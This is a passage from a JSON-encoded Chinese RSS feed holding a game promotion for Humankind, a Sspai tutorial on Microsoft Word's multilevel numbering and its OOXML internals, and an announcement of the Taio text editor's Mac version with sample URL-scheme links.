href=\"http://www.zhihu.com/people/tan-shu-shu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">云吞花卷</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/478580523/answer/2050928315?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/34737252?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些极端不以画工见长的漫画/漫画家？</a><br><a href=\"http://www.zhihu.com/question/455724738?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">漫画以后是否会消失，想成为漫画家，很担心？</a><br>\n","link":"http://www.zhihu.com/question/478580523/answer/2050928315?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021年8月发售的策略游戏新作《HUMANKIND》（人类）？","date":"2021-08-10 11:30:08","description":"\n<p>大家好！</p>\n<p>首先感谢知乎团队的邀请入驻。还有八天，我们的游戏《人类（《HUMANKIND™）》就要上线了，今天为大家带来一个有趣的花絮视频~</p>\n<a href=\"https://www.zhihu.com/video/1408468815714263040\">《人类（HUMANKIND）》游戏规模</a><p>游戏中共有60种不同的历史文化，你可以把它们结合起来，创造一个与你一般的独特文明。我们进行了简单的计算，推断出这60种文化可以产生超过一百万种不同的最终组合……不过实际上，我们到现在都还没算出最终的数字，我们还提供了近乎无限的虚拟形象自定义选项，可以说是无穷无尽~</p>\n<p>所以说游戏的规模很大，但我们还想用更多的数字来告诉你游戏究竟有多大。 </p>\n<p>在《Humankind》中，你可以看到129种不同的单位，他们将在10种细致精美的生态群落中穿行。这些生态群落中栖息着45种不同的动物物种，它们将在荒野中漫游，而你最终也会在其中繁衍生息。而你借此获得的成就和历史声望时刻，将通过700幅独特插图中的一幅来彰显。 </p>\n<p>随着你不断壮大你的文明，在93种科技中不断发展，你将体验到13个半小时的声响效果，内有超过1300个声音文件。与此同时，Arnaud Roy的280首气势磅礴的曲目将不断穿插其中，总共520分钟的配乐，由63名独立音乐家和20名合唱团歌唱人倾情演绎。 </p>\n<p>你自定义的虚拟形象将随着你的文明而发展，你将能够从超过122件量身定制的服装中为他们选择着装，而这些虚拟形象会通过10000多条配音台词来在游戏中表达他们的赞成或反对意见。你在150个叙述性事件中所做的选择将进一步丰富你和你的文明，而你将与竞争对手显得愈发不同——尤其是在支持10名玩家的多人游戏中！ </p>\n<p>《Humankind》已可在PC和Stadia平台上<a href=\"http://link.zhihu.com/?target=https%3A//store.humankind.game/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">进行预购</a>。游戏现在还将从8月17日起登陆Microsoft Xbox Game Pass。我们迫不及待地想让你和我们一起玩游戏，分享你的经历。</p>\n<p>- Amplitude团队</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/amplitude-studios?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">AMPLITUDE STUDIOS</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/383497512/answer/2051296175?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/338744499?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">玩游戏真的可以提升人类的反应力吗？</a><br><a href=\"http://www.zhihu.com/question/312617475?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《人类：一败涂地》真的很好笑吗？</a><br>\n","link":"http://www.zhihu.com/question/383497512/answer/2051296175?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Office 进阶技巧：Word「编号」功能详解","date":"2021-08-10 09:30:15","description":"\n<p><strong>编注：</strong>本篇文章为 Microsoft 365 工具升值包的试读内容，Microsoft 365 是少数派针对 Office 办公套件推出的「工具 + 教程」定制化产品，旨在帮助你用好手边的工具，发挥工具真正的价值。 Microsoft 365 工具升值包限时特惠即将结束，特惠价格购买再送 79 元微软定制鼠标垫，<a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">点击前往淘宝特惠下单</a>。</p>\n<hr>\n<p>编号部分由于内容非常丰富，考虑到各位的阅读体验，遂分为上、下两篇，本文为下篇。</p>\n<hr>\n<p>在从宏观角度了解 Word 中的编号如何定义和应用后，我们再将镜头拉近，观察编号段落的内部结构。</p>\n<h2>内部结构</h2>\n<p>再次回忆：编号是段落格式的一部分，也必须依附于段落而存在。</p>\n<p>本质上，编号只是段落首行开头处的一个文本范围（run），和普通段内文本一样有着字体、字号、颜色等文本格式属性，但其特殊之处在于：</p>\n<ol>\n<li>编号的内容是根据一系列规则自动计算和生成的，而不是手动输入的；</li>\n<li>编号有自己的对齐和缩进设置，因此会波及地影响其所在段落的实际缩进。</li>\n</ol>\n<p>要有一个直观的认识，只要点击任一一个编号数字，灰色底色覆盖的部分就是编号部分的范围。不过，这个看起来自成一体的编号范围，其内部实际上是由很多部分组成的：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/a42cc4b8fa3505a0920fe56059d3ab9d\" alt=\"\"></figure><p>上图中的概念很多，我们结合编号设置的主阵地 ——「定义新多级列表」对话框中的选项逐一介绍。</p>\n<p>要打开「定义新多级列表」对话框，可以在任意编号上单击右键，选择「项目符号和编号」，然后单击「多级符号」选项卡下的「自定义」按钮；或者单击工具栏上的「多级列表」按钮，在下拉菜单中选择「定义新的多级列表」。</p>\n<p>可以看出，该对话框被一道分隔线分为「编号格式」和「位置」两个部分；此外，「字体」按钮还可以打开一个类似于普通字体对话框的界面。这三个部分也就分别对应了编号格式的三大类 —— 与编号数字、对齐方式和编号字体相关的设置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/b1e2f6e74b8ae6875d181273056e4066\" alt=\"\"></figure><h2><strong>与编号数字相关的格式</strong></h2>\n<h3>编号格式</h3>\n<p>即以什么数字或文字显示编号。Word <a href=\"http://webapp.docx4java.org/OnlineDemo/ecma376/WordML/ST_NumberFormat.html\" target=\"_blank\">实际支持的编号格式</a> 有数十种之多，会根据语言版本的不同显示不同选项（例如中文版会提供「壹、贰、叁」等中文大写数字，日文版会提供「壱、弐、参」等日文大写数字），这里不一一列举。</p>\n<p>注意这里的下拉菜单只负责设置编号中的变量，即数字部分；数字前后的固定文本（例如「第一章、」中的「第」「章」二字和后接的顿号）需要在旁边的文本框中手动输入。</p>\n<h3>包含上级编号</h3>\n<p>很多场景下，除了需要显示当前级别的编号，还要包含上级编号。这时，可以在「包含的级别编号来自」下拉菜单中选择需要的级别，相应的上级编号会被追加到编号格式文本框中，你可以反复操作直至添加完所有所需的级别。同样地，你需要手动输入组合编号中的固定部分（例如「5.1(a)」中的句点和括号）。</p>\n<p>如果需要在某级编号中包含所有上级编号、且全部使用阿拉伯数字（形如 <code>1.2</code>，<code>2.3.3</code> 等），则可以勾选「正规形式编号」（legal style numbering，直译为法律格式编号，因在英美法律文书中常用，故名）。</p>\n<h3>起始编号和重新开始编号的间隔</h3>\n<p>这两个选项都与编号数字的「起点」相关。其中，「起始编号」很好理解，就是该级数字从序列中的第几个起算，例如如果设置为 2，则该级数字会（取决于数字格式）从 <code>2</code>、<code>B</code> 或 <code>乙</code> 开始。</p>\n<p>「重新开始编号的间隔」则指该级数字应在遇到哪一上级后重新起算。注意这里可以选择在<strong>任一上级编号</strong>后才重置，未必是<strong>紧邻</strong>的上级编号。例如，在下面的编号序列中，二级编号<code>（一）, （二）, ...</code> 和三级编号 <code>1. , 2. ， ...</code> 都被设置为在一级编号后重置，因此 <code>第一节（二）</code> 下的编号 <code>2.</code> 并未重置，直到遇到下一个一级编号 <code>第二节</code> 才重新从 <code>1.</code> 起算。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/4c60ae7b422ac915d1bf3288aad1f16e\" alt=\"\"></figure><p>不难看出，上述与编号数字相关的设置都仅仅是计数规则，而从未包含数目本身。的确，Word 从不会直接记录任何编号数字，而是根据段落套用的编号规则，现场「掰手指」算出编号的值，显示在段落开头。</p>\n<p>因此，如果你看到两个段落位置上紧邻、编号上连续，这并不表明它们是「一家人」，属于同一个编号序列（或用 OOXML 的术语来说，引用同一个编号实例）。例如，两个显示了编号 <code>10.</code> 和 <code>11.</code> 的段落完全可能分属甲乙两个不同序列，其中前一个段落是甲序列中的第十个，后一个段落是乙序列中的第一个，只是乙序列恰好设置为从 11 起算——就好像哪怕马拉多纳穿 10 号球衣，姚明穿 11 号球衣，他们也不是一个球队的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/7e5f5d7ca9446bb5e69fb3305a480dae.gif\"></figure><p>这种「关公战秦琼」的情况经常发生于在多个文档间来回复制编号的场合。与很多用户想象的不同，当编号被移植到另一个文档时，它未必会自动融入到新文档的编号序列中，而往往会保持原来的编号层级、序列和样式。只是迫于用户的强迫就范——例如手动拖拽标尺、设置字体和滥用编号项右键菜单中的「重新开始编号」（真名是「从这里分拆出一个新编号序列」）和「继续编号」（真名是「从这里缝合两个编号序列」），才显得跟上下文的编号打成一片。一旦事后再次调整编号样式，这些貌合神离的编号就会露出真实面目，显得不听使唤。</p>\n<p>要避免这种情况，在移动编号段落时，应当尽量以 Word 粘贴选项中的<strong>「纯文本」或「匹配目标格式」方式粘贴</strong>，从而去除段落先前带有的编号信息。如果要鉴别编号序列是否存在间断，可以单击要检查的编号，使其处于选中状态，只有与其属于同一序列的其他编号才会一并显示底色。</p>\n<h2><strong>与对齐方式相关的格式</strong></h2>\n<h3>编号对齐方式和对齐位置</h3>\n<p>编号有三种对齐方式，左对齐、居中对齐和右对齐，都是<strong>相对于所在段落的左侧边缘</strong>而言的，分别指编号文本的左侧边缘、中心线或右侧边缘与段落的左侧边缘对齐。而所谓的「对齐位置」就是指上述对齐基线的位置，这是一个绝对数值，从标尺的零点起算。下图中三个段落的编号对齐位置都是 0 英寸，可以看到，后两个设置了居中对齐和右对齐的编号向左突出了一部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/ccf2b986902ea81657ce17e6282ad4da\" alt=\"\"></figure><p>可见，仅在编号对齐方式设置为左对齐时，对齐位置等价于于编号段落的首行起点。对于居中或右对齐的编号，对齐位置控制的是编号的中间线或右边缘位置，因此段落的视觉起点会延伸到更靠左的位置（例如本节开头图中的第四行）。</p>\n<p>（<strong>注：</strong> 顺带一提，如果你对于经常出现在缩进设置中的 0.63、1.27、1.9和 2.54 这几个默认数值感到眼熟却莫名其妙，是因为……微软是一家满脑子英寸制美国公司，这几个默认数值是从 0.25 英寸、0.5 英寸、0.75 英寸、1 英寸换算成厘米产生的。为简明起见，本文举例时暂将 Word 的单位设置改为英寸值。）</p>\n<h3>「编号之后」和制表位添加位置</h3>\n<p> 这组设置决定了编号后的实际文本从何处开始。其中，「编号之后」可在「制表符」（默认）、「空格」和「无」之间选择。比较简单的情况是设置为「无」（或「空格」）。此时，实际文本会紧随编号文本（或附加一个额外空格）后立即开始。</p>\n<p>但如果「编号之后」设置为「制表符」（tab），那么编号和实际文本之间会间隔一个制表符的长度。可那到底是多长呢？答案是……「看情况」。</p>\n<p>Word 中的制表符是一个长度可变的字符，它很像中学物理课上那辆运动在光滑平面上的小车，会一直延伸到下一个<strong>制表位</strong>（tab stop，起源于打字机上用于控制对齐的<a href=\"https://en.wikipedia.org/wiki/Tab_stop\" target=\"_blank\">同名装置</a>）为止。对于没有手动设定制表位的段落，Word 默认将标尺上每 0.5 英寸（0.63 厘米）当作一个制表位（段落的悬挂缩进位置也视为一个制表位）。</p>\n<p>因此，如果编号内容结束于 0.49 英寸处，那么随后的制表符会延伸到 0.5 英寸的位置。换言之，编号与实际文本只间隔了 0.01 英寸。但如果编号内容结束于 0.51 英寸，那么制表符会延伸到下一个默认制表位，即 1 英寸处，此时编号与实际文本间隔了 0.49 英寸。</p>\n<p>这就解释了下图上半部分所示的常见问题：10 以上编号之后的实际文本从很远的位置才开始。这是因为随着编号进入两位数，所占空间变得更大，已经来不及在前一个制表位（下图中的 0.5 英寸位置）之内结束，于是实际文本被「挤」到了下一个制表位（1 英寸位置）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/7ca8f323104825cbd94a3667950fb0fc\" alt=\"\"></figure><p>这时，「制表位添加位置」就能派上用场。它是指在编号段落的指定位置增加一个自定义的制表位，从而覆盖其左侧的全部默认制表位（悬挂缩进除外）。</p>\n<p>还是以上图为例，观察到所有编号末端都不会超过 0.6 英寸，故通过在该处添加一个制表位，就可以实现所有让各段的文本起始位置本对齐到 0.6 英寸的效果（如下半部分所示）。</p>\n<h3><strong>文本缩进位置</strong></h3>\n<p>这是一个让人一言难尽的设置。不妨做一个实验：先将该项数值填写为 0，然后不停单击右侧的上箭头，逐渐增大设置，同时观察预览框中的变化。可以发现，该设置最初只会影响第二行开始的缩进距离；可一旦增大到超过编号部分的宽度，继续上调数值就会同时影响首行实际文本的起始位置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/3e042a869526d65c4744107350137f99.gif\"></figure><p>可见，「文本缩进位置」并不是一个独立的参数，它只是在间接调整着编号段落的特殊缩进：</p>\n<ul>\n<li>当<strong>文本缩进位置 &lt; 编号对齐位置</strong>时：相当于设置首行缩进，后续行文本将从编号对齐位置（也就是编号段落的左侧缩进）更左边开始；</li>\n<li>当<strong>文本缩进位置 = 编号对齐位置</strong>时：相当于关闭特殊缩进，后续行文本将从编号对齐位置开始；</li>\n<li>当<strong>文本缩进位置 &gt; 编号对齐位置</strong>时：相当于设置悬挂缩进，后续行文本将从编号对齐位置的右边开始；并且因为悬挂缩进位置被视为制表位，首行文本也将被编号后的制表符（如果有）「推」到缩进位置，于是最终结果就是首行文本和后续行文本对齐。</li>\n</ul>\n<p>细心的读者可能发现少了一种情况：但如果想让后续行文本比首行文本的缩进更大呢？答案是使用上文介绍的「制表位添加位置」选项，在文本缩进位置之前添加一个制表位，从而将首行文本「堵」在这个制表位上。</p>\n<p>下图演示了这四种不同情况：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/30973722d73ee5fc40ba8183ebd2970e\" alt=\"\"></figure><p>显然，「文本缩进设置」设计是复杂且令人困惑的，也违反了尽量避免操作副作用的程序设计原则。但木已成舟，从用户角度，我们能做的也只是提醒自己在设置时多做几个心算，同时注意观察预览图和标尺。</p>\n<h2><strong>与编号字体相关的格式</strong></h2>\n<p>这部分相对简单明了，即在编号定义对话框中点击「字体」按钮打开的设置，与普通段内文本的字体设置无异。</p>\n<p>不过，在编号定义对话框中做的字体设置会应用到所有编号项中。如果你想单独修改（或重置）某处特定编号的字体设置（例如从别处复制而来的编号段落附带了奇怪的格式），可能会发现编号部分是无法直接用鼠标选中的。如何解决呢？</p>\n<p>如之前的段落一章中所讨论，作为段落格式的一部分，编号的字体格式也是由所在段落结尾的换行标记所控制的。因此，只要打开换行标记的显示，然后对换行标记进行字体设置，就能间接地修改编号的字体，如下图。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/06/article/287128a7c2e8e276450dbd54d7b34708\" alt=\"\"></figure><p>从另一个角度说，这也提示我们要特别保护好段落标记这个编号的「命门」，在复制粘贴、使用格式刷等避免选中不必要的段落标记，导致编号格式被覆盖或丢失。</p>\n<h2><strong>编号的工作原理</strong></h2>\n<p>在了解了编号设置方式和内部结构的基础上，我们最后再深挖一下编号的工作原理。</p>\n<p>文章开头将编号功能比作「艺术」，并不纯粹是种揶揄。在批评文学艺术时，柏拉图曾说艺术是模仿的模仿、影子的影子，与真理隔了三层。柏拉图认为，现实世界是对理念世界的模仿，而艺术又是对现实世界的模仿。</p>\n<p>类似地，Word 中的编号也是从一个抽象的范式出发，经过逐层「模仿」和「套用」，最终变成为文档中显示的实际编号数字。</p>\n<p>在这个模仿链条的最上层，是 Word 文档通过内部编号部件（<code>numbering.xml</code>）存储的一系列编号定义（OOXML 标准称「抽象编号定义」，abstract numbering definitions）。定义的开头是名称、类型、链接的段落样式等基本信息，然后依次列举九级编号各自的格式。上文介绍的「定义新的多级列表」对话框中的各个选项，在编号定义中都有对应的属性。</p>\n<p>编号定义并不会被直接使用。对于文档中每一套编号，Word 都会以一个现有编号定义为模板，建立一个「实例」（OOXML 标准称「编号定义实例」，numbering definition instances）——描绘出一个「仿制品」。这个「仿制」过程并不完全是照葫芦画瓢，而是可以根据需要覆盖模版中的部分设定。</p>\n<p>使用上文介绍的各种方法创建编号时，都会导致新的编号定义和编号实例被创建出来。其中，通过自动编号和多级列表功能创建编号时，Word 文档的编号部件 <code>numbering.xml</code> 中会出现一对新的抽象编号定义以及一个引用该定义的编号实例。而用样式定义功能创建编号时，除了编号定义和编号实例，样式部件 <code>styles.xml</code> 中还会多出一个样式定义，它本身不记录任何编号格式，唯一的作用就是记录这个列表样式的名称。</p>\n<p>最后，当将一个段落设为编号段落时，Word 在该段落的属性中写下要套用的编号实例 <code>numId</code> 和所属层级 <code>ilvl</code>。这样，就可以据此逐层查阅编号部件中的实例和定义，确定要显示的编号数字和格式。</p>\n<p>以下图中的第二个段落 <code>b) [...]</code> 为例，其所在段落的属性表明该段落的编号层级为第二级、套用 id 为 42 的编号实例；Word 据此前往编号部件中检索相应的编号实例，发现它把皮球踢给了 id 为 24 的抽象编号定义；最终，在这个抽象编号定义中，Word 找到了第二级编号应当具有的格式设置，从而显示在文档中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/17034d1ff966b6eb9d37a731e73db564\" alt=\"\"></figure><h2><strong>小结</strong></h2>\n<p>本文关注 Word 中最实用、但也最容易引发用户困惑的功能之一 —— 编号，从设置方式的优劣比较出发，指出设置编号最完善、最稳定的方式是使用段落样式。接着，我们以编号定义对话框为基础，介绍了编号相关的数字格式、对齐方式和字体样式三类格式设置，并解释了各项设置在实际使用中的易错点和解决方案。最后，文章简单介绍了编号的底层工作机制 —— 从一个定义出发、经过逐层套用，最终落地为段落开头的那节数字。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67029"},{"title":"[送码] 为「桌面级」编辑场景优化，文字处理工具 Taio 推出 Mac 版","date":"2021-08-10 08:30:00","description":"\n<h2>前言</h2>\n<p>Taio 是一个 Apple 平台上的文本编辑器和处理工具，此前我们 <a href=\"https://sspai.com/post/65291\"><u>之前的文章</u></a> 中有过介绍过其在 iPhone 和 iPad 上的体验。</p>\n<p>经过最近半年的开发和测试，我们现在将 iPad 版本带到了 Mac 平台。Taio 支持「通用购买」，如果您之前在 iOS 上解锁过高级版，现在即可下载 Mac 版并完成解锁，无需再次付费。</p>\n<p>本文将简要介绍 Mac 版本的概况，并借由 Mac 版本介绍近半年增加的一些新功能。</p>\n<h2>Mac 版本概况</h2>\n<p>需要指出的是，Taio 的 Mac 版本完全使用 Apple 的 Catalyst 技术完成。早期为 iPad 做的一系列优化为我们的移植工作打下了坚实的基础，除了支持 Intel Mac 并为 Apple Silicon 做出优化外，Mac 版本也 100% 地保留了 iPad 版本的全部功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/b89883435a61ca68e40d8f96a3215da5.png\"><figcaption>Mac 版本预览</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/35e8a4d840d2f0ceadbf78ca6d353c38.png\"><figcaption>主题设置</figcaption></figure><p>由于开发精力的问题，我们一开始的计划是在初始版本砍掉一些功能，不过幸运的是碰到的困难都解决了，所以我们在一开始就得到了一个全功能的版本。例如，完全兼容基于 JSBox 编写的全部脚本，支持 macOS Big Sur 及以上的小组件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/c5c3e841a5c661828577c29ae2f80279.png\"><figcaption>运行 JSBox 脚本</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/6e9d33676177c99e31a0bba54a549732.png\"><figcaption>小组件</figcaption></figure><p>另外，我们也解决了 Catalyst 应用广为诟病的中文输入法遮挡和文字抖动的问题，这两个问题您在绝大部分的 Catalyst 应用都能看到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/d63cc050ee1babf16071256bc815b53f.png\"><figcaption>解决输入法遮挡问题</figcaption></figure><h2>Mac 版本独有的功能</h2>\n<p>虽然 Taio 是以移动端体验为主的移植应用，我们还是为其 Mac 版本做了相当多的优化，包括交互方式的改进和与 Mac 系统更好地集成。</p>\n<h3>编辑菜单</h3>\n<p>与移动端不同的是，在 Mac 上我们没有固定位置的输入栏，这也就无法借由其实现 Markdown 编辑菜单。为了解决这个问题，我们引入了浮动的菜单，它会在选择文字或点击屏幕的时候动态出现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/1d4ab14f018377e8b2cd805882781a4a.png\"><figcaption>编辑菜单</figcaption></figure><h3>文字宽度调整</h3>\n<p>考虑到 Mac 上显示器分辨率的可变范围很大，Taio 将允许用户调整文字可读宽度所占屏幕的比例。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/ecfc2f037120f6604760bda3a97a5c5e.png\"><figcaption>可读宽度调整</figcaption></figure><h3>更方便的外观调整</h3>\n<p>我们为 Mac 版本引入了基于系统菜单的外观调整，可以调整深色模式和文字可读宽度，并且支持键盘快捷键。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/ee9f115afbfdec8701399d049a9cc3f7.png\"><figcaption>外观调整</figcaption></figure><h3><strong>与 Mac 系统的集成</strong></h3>\n<p>与 iPad 版本一样，更开放、更好地与系统集成始终是我们的宗旨之一。您可以在访达定位 Taio 的文件，也可以在访达通过 Taio 打开文件，甚至是将 Taio 设置为 Markdown 文件的默认处理程序。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/cd39225915fd95c5279a5b14ce1246f8.png\"><figcaption>在访达中找到</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/132072e2b56cba3e6c70b243365e743b.png\"><figcaption>默认使用 Taio 打开</figcaption></figure><h3>支持快捷指令</h3>\n<p>如果您在使用 macOS Monterey 的 Beta 版本，您会发现 Taio 已经完全支持了 Monterey 上的快捷指令应用，体验和 iOS 版本完全一致。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/dddac5038c44e15d7c9d1f5e7aaff7b5.png\"><figcaption>快捷指令</figcaption></figure><h2>近期新功能</h2>\n<p>过去的半年，我们除了移植 macOS 版本，也没有停下来开发新的功能。考虑到篇幅问题，本文仅介绍我们认为最重要的一些变化。</p>\n<h3>支持脚注和文本高亮</h3>\n<p>这两个特性并非 Markdown 标准语法，但在用户反馈里面呼声很高。您现在可以使用 <code>[^1]</code> 或 <code>[^note]</code> 来实现脚注，使用 <code>==text==</code> 来实现文本高亮。</p>\n<h3>对文本识别的支持</h3>\n<p>基于 Apple 的最新技术，我们增加了用于从图片中识别文本的新动作。如果使用 iOS 15，也支持了从摄像头输入文本的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/8dbbcce18821119e6ea2ae438a188a23.png\"><figcaption>文字识别动作</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/09/12d494f1ea12134f181a0de6f1dfd9e6.png\"><figcaption>扫描文本</figcaption></figure><h3>更多导出格式</h3>\n<p>除了导出为 PDF 和网页等格式，最新版本也支持了导出为 RTF 或 Microsoft Word 等格式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/d21baeec482e8fd2a8b504e341c910fe.png\"><figcaption>更多导出格式</figcaption></figure><h3>新的文本动作</h3>\n<p>为了更好地构建文本工作流，我们新增了一些处理文本的动作，例如查找文本的位置、选择文档等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/db95c4729c4a17d946c88931f0f96278.png\"><figcaption>新的文本处理动作</figcaption></figure><h3>更好的 wiki 链接支持</h3>\n<p>基于用户反馈，我们增强了对 wiki 链接 的支持，例如支持通过 <code>![[Image]]</code> 格式预览图片，并增加了显示链接引用关系的视图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/f511846e35f943a0d0412a0529169024.png\"><figcaption>网络视图</figcaption></figure><h3>实时光标位置</h3>\n<p>为了更好地反应当前位置，Taio 现在会在编辑区域右下角实时显示当前的行列和选中长度，也可以点击它来快速跳转。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/1f644c40fb3393929ac33d14edf09f3a.png\"><figcaption>光标位置和快速跳转</figcaption></figure><h3>增强对 URL scheme 的支持</h3>\n<p>URL scheme 系统可以很好地将 Taio 和其他效率应用联系起来，我们增强了这部分的支持。例如，现在您可以直接打开某个文件为预览模式。</p>\n<pre class=\"language-null\"><code>taio://editor?action=open&amp;path=Example.html&amp;location=0</code></pre>\n<p>支持了打开任意路径的文件，包括添加的文件书签位置。</p>\n<p>此外，也支持了通过 <code>x-callback-url</code> 协议来讲结果返回给调用的应用。</p>\n<pre class=\"language-plaintext hljs\"><code>taio://x-callback-url/actions?action=run&amp;name=name&amp;x-success=successURL&amp;x-error=errorURL&amp;x-cancel=cancelURL</code></pre>\n<h3>全新的编辑器主题、可选应用配色</h3>\n<p>基于「更可读」的考虑，我们为 Taio 设计了全新的 Taio Light 和 Taio Dark 主题，看起来更现代。此外，您也可以更改应用的主题配色了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/138e17c498aea117e9477a4358525796.png\"><figcaption>新的编辑器主题</figcaption></figure><h3>更多的可定制项</h3>\n<p>Taio 一直以「一切皆可定制」作为口号之一，我们也在最近增强了这个部分。现在您不仅可以定制粗体、斜体和列表所使用的语法符号，还可以设置默认使用的资源目录名称。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/c960153efd2be6af5e3312b80ec7837f.png\"><figcaption>更多自定义选项</figcaption></figure><h3>繁体中文支持</h3>\n<p>这也是一个用户反馈中呼声较高的需求，我们一直没有支持是因为我们执着地认为习惯用语的差异很难把握。</p>\n<p>在最新版本里面，我们基于 <a href=\"https://github.com/BYVoid/OpenCC\"><u>OpenCC</u></a> 项目转换了项目中大部分的文本，使用台湾地区的词汇表做了常见的习惯用语替换，并对明显不合理的转换做了修复。</p>\n<p>很难说这是一个高质量的版本，也欢迎提交关于这部分的问题反馈。</p>\n<h3>持续的无障碍投入</h3>\n<p>熟悉我们产品的朋友应该知道，对无障碍的极致追求是我们一直以来的目标。在过去的一段时间，我们也一直在收到无障碍相关的反馈，包括 iOS 版本和 macOS 版本。我们进一步地解决了这些问题，哪怕影响面不是那么广。在此也欢迎无障碍用户持续反馈遇到的问题，以便于我们打造一款完全无障碍的产品。</p>\n<h2>未来计划</h2>\n<p>Taio 的 Mac 版本已经上线，至此我们已经实现了 Apple 平台的全设备支持，这是一个重要的里程碑。我们非常幸运地参与到了 Apple 平台互相融合的进程中，也希望大家喜欢。</p>\n<p>在之后可预见的日子里，我们将会对 iPad 版本的界面做一些改造，使其更符合 Apple 平台的最新实践。而这些计划中的变化，也将是优化 macOS 版本的一个重要部分。</p>\n<p>欢迎在评论区说说你对 Taio 的看法和建议，本周五 (08.13) 选取 5 位读者送出 Taio 年订阅兑换码。</p>\n<span class=\"ss-application\" app-id=\"15830\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68179"},{"title":"国物馆 | 更有烟火气的日常，是我用了这几款九阳","date":"2021-08-10 07:38:11","description":"\n<h4><strong>编者注：</strong></h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 